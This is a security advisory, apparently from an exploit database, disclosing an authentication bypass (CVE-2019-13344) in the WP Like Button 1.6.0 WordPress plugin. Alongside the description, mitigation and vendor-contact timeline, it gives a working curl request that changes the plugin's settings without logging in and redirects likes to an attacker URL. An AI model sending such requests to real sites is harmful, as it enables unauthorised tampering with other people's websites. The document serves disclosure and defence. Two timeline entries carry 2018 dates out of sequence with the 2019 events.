@@ -1,0 +1,46 @@
+Exploit Title: WP Like Button 1.6.0 - Auth Bypass
+Date: 05-Jul-19
+Exploit Author: Benjamin Lim
+Vendor Homepage: http://www.crudlab.com
+Software Link: https://wordpress.org/plugins/wp-like-button/
+Version: 1.6.0
+CVE : CVE-2019-13344
+
+1. Product & Service Introduction:
+WP Like button allows you to add Facebook like button on your wordpress
+blog. You can also add Share button along with Like button or can add
+recommend button. As of now, the plugin has been downloaded 129,089 times
+and has 10,000+ active installs.
+
+2. Technical Details & Description:
+Authentication Bypass vulnerability in the WP Like Button (Free) plugin
+version 1.6.0 allows unauthenticated attackers to change the settings of
+the plugin. The contains() function in wp_like_button.php did not check if
+the current request is made by an authorized user, thus allowing any
+unauthenticated user to successfully update the settings of the plugin.
+
+3. Proof of Concept (PoC):
+For example, the curl command below allows an attacker to change the
+each_page_url parameter to https://hijack.com. This allows the attacker to
+hijack Facebook likes.
+
+curl -k -i --raw -X POST -d
+"page=facebook-like-button&site_url=https%%3A%%2F%%2Flocalhost%%2Fwp&display[]=1&display[]=2&display[]=4&display[]=16&mobile=1&fb_app_id=&fb_app_admin=&kd=0&fblb_default_upload_image=&code_snippet=%%3C%%3Fphp+echo+fb_like_button()%%3B+%%3F%%3E&beforeafter=before&eachpage=url&each_page_url=
+https://hijack.com&language=en_US&width=65&position=center&layout=box_count&action=like&color=light&btn_size=small&faces=1&share=1&update_fblb="
+"https://localhost/wp/wp-admin/admin.php?page=facebook-like-button&edit=1"
+-H "Content-Type: application/x-www-form-urlencoded"
+
+4. Mitigation
+No update has been released by the vendor. Users are advised to switch to a
+different plugin.
+
+5. Disclosure Timeline
+2019/06/24 Vendor contacted regarding vulnerability in v1.5.0 (crudlab@gmail.com)
+2019/06/30 Second email sent to vendor (crudlab@gmail.com)
+2019/07/02 Vendor released v1.6.0 update. Vulnerability still exists.
+Vendor did not acknowledge any emails.
+2018/07/03 Third email sent to vendor's billing email domain (info@purelogics.net)
+2018/07/05 Public disclosure
+
+6. Credits & Authors:
+Benjamin Lim - [https://limbenjamin.com]
